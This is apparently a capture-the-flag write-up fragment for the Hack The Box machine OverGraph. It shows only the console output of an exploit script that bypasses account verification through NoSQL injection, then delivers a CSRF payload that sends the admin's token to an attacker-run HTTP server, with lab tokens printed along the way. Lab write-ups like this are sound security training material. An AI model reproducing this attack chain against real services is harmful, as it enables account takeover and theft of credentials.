## OverGraph machine on HTB
### URL: https://app.hackthebox.com/machines/464
### Difficulty: Hard

## Exploitation
**Example Output:**
```
C:\Users\moham>python C:\Users\moham\OneDrive\Desktop\exfilAdminToken.py --lhost 10.10.16.6
[*] Starting exploit
[*] Attacker server host: 10.10.16.6
[*] Attacker Server port: 80
[*] Proxy: {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}
[*] Starting account creation process...
[*] Requesting verification code for johndoe@graph.htb
[+] Verification code requested successfully
[*] Verifying account via NoSQL injection
[+] Account verified successfully
[*] Registering account
[+] Account created successfully
[*] Logging in as johndoe@graph.htb
[+] Login successful
[+] JohnDoe's Auth Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY4NzBlYmIwZTliZjM1MDQzMjIzMzEwZSIsImVtYWlsIjoiam9obmRvZUBncmFwaC5odGIiLCJpYXQiOjE3NTIyMzA4MzMsImV4cCI6MTc1MjMxNzIzM30.1g8vStgSIBudsszXG7McxArfGzg3c6nORh3_Uw3n4Co
[*] Starting admin token exfiltration...
[*] Retrieving victim's username...
[+] Victim username: Larry
[*] Retrieving victim's account ID...
[+] Victim account ID: 6266b771a7d6cb04ec3abdac
[+] CSRF payload written to csrf.js
[+] HTTP Server started on port 80
[+] Waiting for admin token (timeout: 300s)...
[*] Delivering CSRF attack...
[+] CSRF attack delivered successfully!
[+] Waiting for admin token...

[+] Admin token received: c0b9db4c8e4bbb24d59a3aaffa8c8b83
[+] Token received, shutting down server
[+] Admin token successfully exfiltrated!
[+] Exploit completed successfully!
[+] Admin token saved to admin_token.txt: c0b9db4c8e4bbb24d59a3aaffa8c8b83

C:\Users\moham>
```
